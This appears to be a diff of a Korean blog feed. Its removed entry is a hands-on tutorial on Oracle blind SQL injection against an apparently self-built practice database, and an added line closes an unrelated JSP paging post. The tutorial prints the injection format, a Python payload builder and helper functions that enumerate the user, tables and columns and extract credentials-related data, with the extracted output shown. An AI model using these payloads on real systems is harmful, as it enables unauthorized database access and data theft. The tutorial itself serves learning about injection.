-</span><span class="k">def</span> <span class="nf">attack_query</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="n">row</span><span class="p">,</span> <span class="n">point</span><span class="p">,</span> <span class="nb">ascii</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span> <span class="p">:</span>
-<span class="err"> </span> <span class="err"> </span> <span class="n">attack_query</span> <span class="o">=</span> <span class="p">(</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">"user2' and ((ascii(substr(("</span><span class="p">,</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">sql</span><span class="p">,</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">" OFFSET "</span><span class="p">,</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">str</span><span class="p">(</span><span class="n">row</span><span class="p">),</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">" ROWS FETCH NEXT 1 ROWS ONLY),"</span><span class="p">,</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">str</span><span class="p">(</span><span class="n">point</span><span class="p">),</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">",1)))&gt;"</span><span class="p">,</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">str</span><span class="p">(</span><span class="nb">ascii</span><span class="p">),</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">") and '1'='1"</span>
-<span class="err"> </span> <span class="err"> </span> <span class="p">)</span>
-<span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">attack_query</span><span class="p">)</span>
-</code></pre></div></div>
-
-<h2 id="사용자-명-추출-하기">사용자 명 추출 하기.</h2>
-<ul>
-  <li>현재 사용중인 사용자 명을 출력한다.</li>
-</ul>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">user</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
-<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">user</span> <span class="k">from</span> <span class="n">dual</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
-<span class="err">성공</span>
-
-<span class="err">한</span> <span class="err">문자씩</span> <span class="err">찾아주면</span> <span class="err">된다</span><span class="p">.</span>
-</code></pre></div></div>
-
-<ul>
-  <li>파이썬 코드로 빠르게 사용자 명 찾기.</li>
-</ul>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_current_user_name</span><span class="p">():</span>
-<span class="err"> </span> <span class="err"> </span> <span class="n">query</span> <span class="o">=</span> <span class="s">"select user from dual"</span>
-<span class="err"> </span> <span class="err"> </span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="o">=</span> <span class="n">query</span><span class="p">)</span>
-<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
-</code></pre></div></div>
-
-<ul>
-  <li>추출한 데이터.</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C##DBFORPROB
-</code></pre></div></div>
-
-<h2 id="테이블-명-추출하기">테이블 명 추출하기.</h2>
-<ul>
-  <li>현재 존재하는 테이블 명들을 추출해 보자.</li>
-</ul>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">all_tables</span> <span class="k">where</span> <span class="k">owner</span><span class="o">=</span><span class="s1">'C##DBFORPROB'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
-<span class="err">또는</span> 
-<span class="k">select</span> <span class="n">tname</span> <span class="k">from</span> <span class="n">tab</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
-
-<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">all_tables</span> <span class="k">where</span> <span class="k">owner</span><span class="o">=</span><span class="s1">'C##DBFORPROB'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
-
-<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="n">tname</span> <span class="k">from</span> <span class="n">tab</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
-
-<span class="err">더</span> <span class="err">짧은</span> <span class="mi">2</span><span class="err">번째</span> <span class="err">공격</span> <span class="err">포맷을</span> <span class="err">이용하였다</span><span class="p">.</span>
-</code></pre></div></div>
-
-<ul>
-  <li>파이썬 코드로 빠르게 테이블 명 찾기.</li>
-</ul>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_table_name</span><span class="p">():</span>
-<span class="err"> </span> <span class="err"> </span> <span class="n">query</span> <span class="o">=</span> <span class="s">"select tname from tab"</span>
-<span class="err"> </span> <span class="err"> </span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
-<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
-</code></pre></div></div>
-
-<ul>
-  <li>추출한 데이터.</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MEMBERS
-TEST
-</code></pre></div></div>
-
-<h2 id="컬럼-명-추출하기">컬럼 명 추출하기.</h2>
-<ul>
-  <li>테이블의 컬럼명을 추출하기.</li>
-</ul>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">cols</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'MEMBERS'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
-<span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">cols</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'TEST'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
-
-<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">cols</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'MEMBERS'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
-</code></pre></div></div>
-
-<ul>
-  <li>파이썬 코드로 빠르게 컬럼 명 찾기.</li>
-</ul>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_column_name</span><span class="p">(</span><span class="n">table_name</span><span class="p">):</span>
-<span class="err"> </span> <span class="err"> </span> <span class="n">query</span> <span class="o">=</span> <span class="s">"select column_name from cols where table_name='"</span><span class="o">+</span><span class="n">table_name</span><span class="o">+</span><span class="s">"'"</span>
-<span class="err"> </span> <span class="err"> </span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
-<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
-</code></pre></div></div>
-
-<ul>
-  <li>추출한 데이터.</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MEMBERS 컬럼이름
-SID
-ID
-PASSWORD
-EMAIL
-INFO
-HASHPWD
-
-TEST 컬럼이름
-MSG
-</code></pre></div></div>
-
-<h2 id="데이터-추출하기">데이터 추출하기</h2>
-<ul>
-  <li>테이블에  저장되어 있는 데이터 추출하기.</li>
-</ul>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="err">컬럼이름</span> <span class="k">from</span> <span class="err">테이블명</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
-
-<span class="k">select</span> <span class="n">MSG</span> <span class="k">from</span> <span class="n">TEST</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
-
-<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="n">MSG</span> <span class="k">from</span> <span class="n">TEST</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
-</code></pre></div></div>
-
-<ul>
-  <li>파이썬 코드로 빠르게 데이터 추출하기.</li>
-</ul>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_table_data</span><span class="p">(</span><span class="n">column</span><span class="p">,</span> <span class="n">table_name</span><span class="p">):</span>
-<span class="err"> </span> <span class="err"> </span> <span class="n">query</span> <span class="o">=</span> <span class="s">"select "</span><span class="o">+</span><span class="n">column</span><span class="o">+</span><span class="s">" from "</span><span class="o">+</span><span class="n">table_name</span>
-<span class="err"> </span> <span class="err"> </span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
-<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
-</code></pre></div></div>
-
-<ul>
-  <li>추출한 데이터.</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MEMBERS 데이터 추출
-root
-dad
-user123
-user2
-
-TEST 데이터 추출
-blind sql injection success
-</code></pre></div></div>
-
-<h2 id="결과">결과</h2>
-<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2b4957ca-e70d-4f4b-bd3e-01a45970eaaa" alt="Pasted image 20230512003709" /></p>
-
-<h2 id="전체-코드">전체 코드</h2>
-<script src="https://gist.github.com/MinGyu2/ed9926c11854380ea75abef3fbdfa4e5.js"></script>]]></content><author><name>Jung MinGyu</name></author><category term="Oracle DB" /><category term="Blind SQLi" /><category term="SQLi" /><category term="웹 해킹" /><summary type="html"><![CDATA[직접 Blind SQL Injection 을 시도해보자.]]></summary></entry></feed>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="웹" /><category term="jsp" /><category term="servlet" /><summary type="html"><![CDATA[게시글에 페이징 번호를 추가하자.]]></summary></entry></feed>
